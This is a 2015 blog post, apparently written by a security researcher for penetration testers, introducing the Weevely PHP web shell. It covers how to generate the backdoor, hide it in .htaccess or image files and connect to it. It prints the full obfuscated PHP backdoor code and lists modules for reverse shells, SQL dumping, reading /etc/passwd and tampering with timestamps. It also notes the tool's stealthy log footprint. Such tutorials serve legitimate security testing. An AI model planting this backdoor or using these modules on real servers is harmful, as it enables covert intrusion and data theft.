@@ -1,0 +1,412 @@
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
+<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
+<head>
+<meta charset="utf-8">
+<title>Weevely &#8211; Gwendal Le Coguic</title>
+<meta name="description" content="Gwendal Le Coguic, web developer and security researcher">
+<meta name="keywords" content="backdoor, remote command execution">
+
+<!-- Twitter Cards --><meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://10degres.net/assets/img/header-background.jpg">
+<meta name="twitter:title" content="Weevely">
+<meta name="twitter:description" content="Gwendal Le Coguic, web developer and security researcher">
+<meta name="twitter:creator" content="@gwendallecoguic">
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weevely">
+<meta property="og:description" content="Gwendal Le Coguic, web developer and security researcher">
+<meta property="og:url" content="http://10degres.net/weevely/">
+<meta property="og:site_name" content="Gwendal Le Coguic">
+<meta property="og:image" content="http://10degres.net/assets/img/header-background.jpg">
+
+
+<meta name="google-site-verification" content="GnoFwHUV3XNgLy4D-7XjLQ0Dbw6fKBXZnBzMn-0GBX8">
+
+
+
+<link rel="canonical" href="http://10degres.net/weevely/">
+<link href="http://10degres.net/feed.xml" type="application/atom+xml" rel="alternate" title="Gwendal Le Coguic Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="http://10degres.net/assets/css/main.css">
+<!-- Webfonts -->
+<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">
+
+<meta http-equiv="cleartype" content="on">
+
+<!-- Load Modernizr -->
+<script src="http://10degres.net/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>
+
+<!-- Icons -->
+<!-- 16x16 -->
+<link rel="shortcut icon" href="http://10degres.net/favicon.ico">
+<!-- 32x32 -->
+<link rel="shortcut icon" href="http://10degres.net/favicon.png">
+
+
+
+</head>
+
+<body id="post" class="feature">
+
+<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
+<nav id="dl-menu" class="dl-menuwrapper" role="navigation">
+	<button class="dl-trigger">Open Menu</button>
+	<ul class="dl-menu">
+		<li><a href="http://10degres.net/">Home</a></li>
+		<li>
+			<a href="#">About</a>
+			<ul class="dl-submenu">
+				<li>
+					<img src="http://10degres.net/assets/img/me.jpg" alt="Gwen photo" class="author-photo">
+					<h4>Gwen</h4>
+					<p>Web developer reconverted to security researcher, playing bug bounty sometimes :)</p>
+				</li>
+				<li><a href="http://10degres.net/about/"><span class="btn btn-inverse">Learn More</span></a></li>
+				<li>
+					<a href="mailto:g@10degres.net"><i class="fa fa-fw fa-envelope"></i> Email</a>
+				</li>
+				<li>
+					<a href="https://twitter.com/gwendallecoguic" target="_blank"><i class="fa fa-fw fa-twitter"></i> Twitter</a>
+				</li>
+				
+				
+				<li>
+					<a href="https://linkedin.com/in/gwendal-le-coguic-77106729" target="_blank"><i class="fa fa-fw fa-linkedin"></i> LinkedIn</a>
+				</li>
+				<li>
+					<a href="https://github.com/gwen001" target="_blank"><i class="fa fa-fw fa-github"></i> GitHub</a>
+				</li>
+				
+				
+				
+				
+			</ul><!-- /.dl-submenu -->
+		</li>
+		<li>
+			<a href="#">Posts</a>
+			<ul class="dl-submenu">
+				<li><a href="http://10degres.net/posts/">All Posts</a></li>
+				<li><a href="http://10degres.net/tags/">All Tags</a></li>
+			</ul>
+		</li>
+		
+	</ul><!-- /.dl-menu -->
+</nav><!-- /.dl-menuwrapper -->
+
+
+
+<div class="entry-header">
+  
+  <div class="entry-image">
+    <img src="http://10degres.net/assets/img/header-background.jpg" alt="Weevely">
+  </div><!-- /.entry-image -->
+</div><!-- /.entry-header -->
+
+
+<div id="main" role="main">
+  <article class="hentry">
+    <header class="header-title">
+      <div class="header-title-wrap">
+        
+          <h1 class="entry-title"><a href="http://10degres.net/weevely/" rel="bookmark" title="Weevely">Weevely</a></h1>
+        
+        <h2><span class="entry-date date published"><time datetime="2015-02-19T00:00:00+00:00">February 19, 2015</time></span></h2>
+        
+      </div><!-- /.header-title-wrap -->
+    </header>
+    <div class="entry-content">
+      <p>Weevely is a PHP command line web shell usually used as a backdoor while performing the post exploitation phase of a penetration test. 
+By default in Kali Linux, the installed version 1.1 isn’t supported anymore but version 3 is available on <a href="https://github.com/epinna/weevely3" title="Weevely on GitHub" class="flashlink" target="_blank">GitHub</a>.</p>
+
+<p>Generate the backdoor:</p>
+
+<p><code class="highlighter-rouge">weevely generate.&lt;mode&gt; &lt;password&gt; &lt;path&gt;</code></p>
+
+<p>The password is optionnal but it’s important to protect your customer from other users because an unwanted access can easily lead to a full access on the server with privileges escalation. There is three kinds of backdoor available but this functionnality seems to have been removed in version 3.</p>
+
+<ul>
+  <li><strong>htaccess</strong>: a single <code class="highlighter-rouge">.htaccess</code> file is created containing the malicious code and the right Apache directive so that all <code class="highlighter-rouge">.htaccess</code> files are considered as regular PHP script</li>
+  <li><strong>img</strong>: giving an existing image, Weevely will concatenate the binary datas and the malicious code, plus it also creates an <code class="highlighter-rouge">.htaccess</code> 
+to tell Apache that the image should be considered as a regular PHP script (that means both files should be uploaded on the target server)</li>
+  <li><strong>php</strong>: this is the default, a single PHP script is generated</li>
+</ul>
+
+<!--more-->
+
+<p>Example:</p>
+
+<p><a href="/images/weevely-generate.png"><img src="/images/weevely-generate.png" alt="Weevely generate" /></a></p>
+
+<p>A <code class="highlighter-rouge">sessions</code> directory has also been created to log every command. 
+No matter what creation mode you choosed the obfuscated generated PHP code looks like this:</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$ztqi</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"h"</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="s2">"hshtrh_rhehphlhahche"</span><span class="p">);</span>
+<span class="nv">$hule</span><span class="o">=</span><span class="s2">"am9pbihhcnJhehrV9zbGhrljZSgkYSwkhrYhrygkYhrSktMykpKShrkpO2VjaG8gJzwvJhry4kay4nhrPic7fQ=="</span><span class="p">;</span>
+<span class="nv">$xhmv</span><span class="o">=</span><span class="s2">"PSdlcnRhr5JztlY2hvIhrCc8Jy4kay4nPihrc7ZXhrZhbChiYXNlNjRfZGVjbhr2RlKHBhryZWdfchrmVhrwbGFjZ"</span><span class="p">;</span>
+<span class="nv">$ezko</span><span class="o">=</span><span class="s2">"ShhcnJheSgnL1hrteXHc9XHNdLycsJy9chrcy8nKSwgYXJyYXkohrJyhrcshrJyhrsnKSwg"</span><span class="p">;</span>
+<span class="nv">$kyjf</span><span class="o">=</span><span class="s2">"JGM9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYhrSk9PSdheicgJihrYgJGMoJGEpPjMpeyRr"</span><span class="p">;</span>
+<span class="nv">$tjbu</span> <span class="o">=</span> <span class="nv">$ztqi</span><span class="p">(</span><span class="s2">"g"</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="s2">"basgeg6g4g_gdgegcgode"</span><span class="p">);</span>
+<span class="nv">$plri</span> <span class="o">=</span> <span class="nv">$ztqi</span><span class="p">(</span><span class="s2">"y"</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="s2">"cyreyatye_yfuynycytyiyon"</span><span class="p">);</span>
+<span class="nv">$pigj</span> <span class="o">=</span> <span class="nv">$plri</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span> <span class="nv">$tjbu</span><span class="p">(</span><span class="nv">$ztqi</span><span class="p">(</span><span class="s2">"hr"</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$kyjf</span><span class="o">.</span><span class="nv">$xhmv</span><span class="o">.</span><span class="nv">$ezko</span><span class="o">.</span><span class="nv">$hule</span><span class="p">)));</span> <span class="nv">$pigj</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
+</code></pre>
+</div>
+
+<p>There is different ways to inject the backdoor on the target server: file upload, SQL injection and so on… 
+Once you have infected your target, you can connect to the client with the password you choosed:</p>
+
+<p><a href="/images/weevely-connect.png"><img src="/images/weevely-connect.png" alt="Weevely connect" /></a></p>
+
+<p>Running <code class="highlighter-rouge">:help </code>will display the list of all modules available or the detailed usage informations of the given module.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Command</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>:audit.systemfiles</td>
+      <td>Find wrong system files permissions</td>
+    </tr>
+    <tr>
+      <td>:audit.phpconf</td>
+      <td>Check php security configurations</td>
+    </tr>
+    <tr>
+      <td>:audit.mapwebfiles</td>
+      <td>Crawl and enumerate web folders files permissions</td>
+    </tr>
+    <tr>
+      <td>:audit.userfiles</td>
+      <td>Guess files with wrong permissions in users home folders</td>
+    </tr>
+    <tr>
+      <td>:audit.etcpasswd</td>
+      <td>Enumerate users and /etc/passwd content</td>
+    </tr>
+    <tr>
+      <td>:shell.sh</td>
+      <td>Execute system shell command</td>
+    </tr>
+    <tr>
+      <td>:shell.php</td>
+      <td>Execute PHP statement</td>
+    </tr>
+    <tr>
+      <td>:system.info</td>
+      <td>Collect system informations</td>
+    </tr>
+    <tr>
+      <td>:backdoor.reversetcp</td>
+      <td>Send reverse TCP shell</td>
+    </tr>
+    <tr>
+      <td>:backdoor.tcp</td>
+      <td>Open a shell on TCP port</td>
+    </tr>
+    <tr>
+      <td>:bruteforce.sqlusers</td>
+      <td>Bruteforce all SQL users</td>
+    </tr>
+    <tr>
+      <td>:bruteforce.sql</td>
+      <td>Bruteforce SQL username</td>
+    </tr>
+    <tr>
+      <td>:file.edit</td>
+      <td>Edit remote file</td>
+    </tr>
+    <tr>
+      <td>:file.mount</td>
+      <td>Mount remote filesystem using HTTPfs</td>
+    </tr>
+    <tr>
+      <td>:file.webdownload</td>
+      <td>Download web URL to remote filesystem</td>
+    </tr>
+    <tr>
+      <td>:file.touch</td>
+      <td>Change file timestamps</td>
+    </tr>
+    <tr>
+      <td>:file.upload2web</td>
+      <td>Upload binary/ascii file into remote web folders and guess corresponding url</td>
+    </tr>
+    <tr>
+      <td>:file.download</td>
+      <td>Download binary/ascii files from the remote filesystem</td>
+    </tr>
+    <tr>
+      <td>:file.enum</td>
+      <td>Enumerate remote paths</td>
+    </tr>
+    <tr>
+      <td>:file.read</td>
+      <td>Read remote file</td>
+    </tr>
+    <tr>
+      <td>:file.upload</td>
+      <td>Upload binary/ascii file into remote filesystem</td>
+    </tr>
+    <tr>
+      <td>:file.check</td>
+      <td>Check remote files type, md5 and permission</td>
+    </tr>
+    <tr>
+      <td>:file.rm</td>
+      <td>Remove remote files and folders</td>
+    </tr>
+    <tr>
+      <td>:file.ls</td>
+      <td>List directory contents</td>
+    </tr>
+    <tr>
+      <td>:sql.console</td>
+      <td>Run SQL console or execute single queries</td>
+    </tr>
+    <tr>
+      <td>:sql.dump</td>
+      <td>Get SQL database dump</td>
+    </tr>
+    <tr>
+      <td>:net.phpproxy</td>
+      <td>Install remote PHP proxy</td>
+    </tr>
+    <tr>
+      <td>:net.ifaces</td>
+      <td>Print interfaces addresses</td>
+    </tr>
+    <tr>
+      <td>:net.scan</td>
+      <td>Port scan open TCP ports</td>
+    </tr>
+    <tr>
+      <td>:net.proxy</td>
+      <td>Install and run Proxy to tunnel traffic through target</td>
+    </tr>
+    <tr>
+      <td>:find.suidsgid</td>
+      <td>Find files with superuser flags</td>
+    </tr>
+    <tr>
+      <td>:find.name</td>
+      <td>Find files with matching name</td>
+    </tr>
+    <tr>
+      <td>:find.perms</td>
+      <td>Find files with write, read, execute permissions</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Another good point for Weevely is the verbosity, the remote agent is very low footprint. Below my Apache logs after running some commands:</p>
+
+<p><a href="/images/weevely-traces.png"><img src="/images/weevely-traces.png" alt="Weevely traces" /></a></p>
+
+<p>As you may notice the user-agent has also been randomized wich is usually a good idea…</p>
+
+      <footer class="entry-meta">
+        <span class="entry-tags"><a href="http://10degres.net/tags/#backdoor" title="Pages tagged backdoor" class="tag"><span class="term">backdoor</span></a><a href="http://10degres.net/tags/#remote command execution" title="Pages tagged remote command execution" class="tag"><span class="term">remote command execution</span></a></span>
+        
+        <div class="social-share">
+  <ul class="socialcount socialcount-small inline-list">
+    <li class="facebook"><a href="https://www.facebook.com/sharer/sharer.php?u=http://10degres.net/weevely/" title="Share on Facebook"><span class="count"><i class="fa fa-facebook-square"></i> Like</span></a></li>
+    <li class="twitter"><a href="https://twitter.com/intent/tweet?text=http://10degres.net/weevely/" title="Share on Twitter"><span class="count"><i class="fa fa-twitter-square"></i> Tweet</span></a></li>
+    <li class="googleplus"><a href="https://plus.google.com/share?url=http://10degres.net/weevely/" title="Share on Google Plus"><span class="count"><i class="fa fa-google-plus-square"></i> +1</span></a></li>
+  </ul>
+</div><!-- /.social-share -->
+      </footer>
+    </div><!-- /.entry-content -->
+    
+    <div class="see-also">
+	<div class="see-also-header">
+		<a href="javascript:;" class="see-also-btn">See Also</a>
+	</div><!-- /.see-also-header -->
+	<article>
+		<ul>
+			
+				
+					<li class="entry-title"><a href="http://blog.10degres.net/introduction-to-pentesting/" target="_blank">Introduction to pentesting</a></li>
+				
+			
+		</ul>
+	</article>
+</div><!-- /.see-also -->
+
+    
+
+<div class="read-more">
+  
+    <div class="read-more-header">
+      <a href="javascript:;" class="read-more-btn">Read More</a>
+    </div><!-- /.read-more-header -->
+    <div class="read-more-content">
+      <h3><a href="http://10degres.net/subdomain-enumeration/" title="Subdomain enumeration">Subdomain enumeration</a></h3>
+      <p>A friend recently asked me what methods I use to find subdomains.To be honest I was confused, like *"oooohhh so much, brute force mmm... ...&hellip; <a href="http://10degres.net/subdomain-enumeration/">Continue reading</a></p>
+    </div><!-- /.read-more-content -->
+  
+  <div class="read-more-list">
+	  <div class="list-item">
+		  
+			<h4><a href="/dns-enumeration-with-host/">&laquo; DNS enumeration with Host</a></h4>
+			<span>Published on February 27, 2015</span>
+		  
+	  </div><!-- /.list-item -->
+	  <div class="list-item">
+		
+			<h4><a href="/vulnerability-in-wordpress-video-gallery/">Vulnerability in Wordpress Video Gallery &raquo; </a></h4>
+			<span>Published on February 12, 2015</span>
+		
+	  </div><!-- /.list-item -->
+  </div><!-- /.read-more-list -->
+</div><!-- /.read-more -->
+
+  </article>
+</div><!-- /#main -->
+
+<div class="footer-wrapper">
+  <footer role="contentinfo">
+    <span>&copy; 2018 Gwendal Le Coguic</span>
+
+  </footer>
+</div><!-- /.footer-wrapper -->
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script>window.jQuery || document.write('<script src="http://10degres.net/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
+<script src="http://10degres.net/assets/js/scripts.min.js"></script>
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-61485350-1', 'auto');  
+  ga('require', 'linkid', 'linkid.js');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+	        
+
+</body>
+</html>
